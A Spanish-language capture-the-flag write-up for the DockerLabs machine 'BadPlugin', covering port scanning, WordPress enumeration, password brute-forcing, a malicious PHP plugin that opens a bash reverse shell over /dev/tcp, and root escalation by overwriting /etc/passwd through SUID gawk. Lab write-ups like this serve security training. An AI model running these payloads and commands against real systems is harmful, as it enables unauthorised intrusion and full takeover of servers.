#MAQUINA #DOCKERLABS #MEDIO 
#WORDPRESS #WPSCAN 
<hr>

# RECONOCIMIENTO

Vamos a resolver **BadPlugin** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 192.168.1.100


```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS -vvv -p- --min-rate 5000 -n -Pn 192.168.1.100
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 10:35 CET
Initiating ARP Ping Scan at 10:35
Scanning 192.168.1.100 [1 port]
Completed ARP Ping Scan at 10:35, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 10:35
Scanning 192.168.1.100 [65535 ports]
Discovered open port 80/tcp on 192.168.1.100
Completed SYN Stealth Scan at 10:35, 0.56s elapsed (65535 total ports)
Nmap scan report for 192.168.1.100
Host is up, received arp-response (0.0000040s latency).
Scanned at 2025-03-20 10:35:55 CET for 1s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:42:C0:A8:01:64 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.73 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene el puerto **80(HTTP)** abierto.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p80 192.168.1.100                       
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 10:36 CET
Nmap scan report for 192.168.1.100
Host is up (0.000022s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Error Message
MAC Address: 02:42:C0:A8:01:64 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.40 seconds




```

   ```bash

nmap --script="http-enum" 192.168.1.100
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-20 10:37 CET
Nmap scan report for 192.168.1.100
Host is up (0.0000040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /info.php: Possible information file
|   /phpmyadmin/: phpMyAdmin
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 02:42:C0:A8:01:64 (Unknown)

whatweb "http://192.168.1.100/wordpress/"
http://192.168.1.100/wordpress/ [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.1.100], RedirectLocation[http://escolares.dl/wordpress/], UncommonHeaders[x-redirect-by]
http://escolares.dl/wordpress/ [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[192.168.1.100], JQuery[3.7.1], MetaGenerator[Elementor 3.26.3; features: e_font_icon_svg, additional_custom_breakpoints, e_element_cache; settings: css_print_method-external, google_font-enabled, font_display-swap,WordPress 6.7.1], Script[text/javascript], Title[badplugin], UncommonHeaders[link], WordPress[6.7.1]

                                                            


```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

**Conclusiones:** Tenemos un  **WP**.

## HTTP (80)

Usamos **wpscan** :

```bash
wpscan --url "http://escolares.dl/wordpress/" --enumerate u,p
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Plugin(s) Identified:

[+] astra-sites
 | Location: http://escolares.dl/wordpress/wp-content/plugins/astra-sites/
 | Last Updated: 2025-02-10T06:39:00.000Z
 | [!] The version is out of date, the latest version is 4.4.12
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 4.4.10 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-content/plugins/astra-sites/readme.txt

[+] elementor
 | Location: http://escolares.dl/wordpress/wp-content/plugins/elementor/
 | Last Updated: 2025-02-16T12:20:00.000Z
 | [!] The version is out of date, the latest version is 3.27.5
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 3.26.3 (100% confidence)
 | Found By: Query Parameter (Passive Detection)
 |  - http://escolares.dl/wordpress/wp-content/plugins/elementor/assets/css/frontend.min.css?ver=3.26.3
 |  - http://escolares.dl/wordpress/wp-content/plugins/elementor/assets/js/frontend.min.js?ver=3.26.3
 | Confirmed By:
 |  Readme - Stable Tag (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-content/plugins/elementor/readme.txt
 |  Readme - ChangeLog Section (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-content/plugins/elementor/readme.txt
[i] User(s) Identified:

[+] admin
 | Found By: Wp Json Api (Aggressive Detection)
 |  - http://escolares.dl/wordpress/wp-json/wp/v2/users/?per_page=100&page=1
 | Confirmed By:
 |  Oembed API - Author URL (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-json/oembed/1.0/embed?url=http://escolares.dl/wordpress/&format=json
 |  Author Sitemap (Aggressive Detection)
 |   - http://escolares.dl/wordpress/wp-sitemap-users-1.xml
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

```


 Vamos a sacar la contra de admin :
 
```bash
wpscan --url "http://escolares.dl/wordpress/" -U admin -P /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
[!] Valid Combinations Found:
 | Username: admin, Password: rockyou

```

# EXPLOTACION

Nos vamos a plugins y subimos y activamos un plugin. Vamos a subir un zip que nos otorgue una reverse shell y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**).
Contenido del zip, un php con:

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.1.100/443 0>&1'");

?>

```

YA ESTAMOS COMO WWW-DATA.
# ESCALADA PRIVILEGIOS

Vemos archivos con permisos SUID:

```bash
www-data@69dcc831be30:/$ find / -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/gawk
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

```

Tenemos **gawk**: 

```bash
www-data@69dcc831be30:/tmp$ gawk -v LFILE=/etc/passwd 'BEGIN{ print "root::0:0:root:/root:/bin/bash"  > LFILE}'
www-data@69dcc831be30:/tmp$ cat /etc/passwd
root::0:0:root:/root:/bin/bash
www-data@69dcc831be30:/tmp$ su root
root@69dcc831be30:/tmp# whoami
root
root@69dcc831be30:/tmp# 

```

**YA ESTAMOS COMO ROOT.**

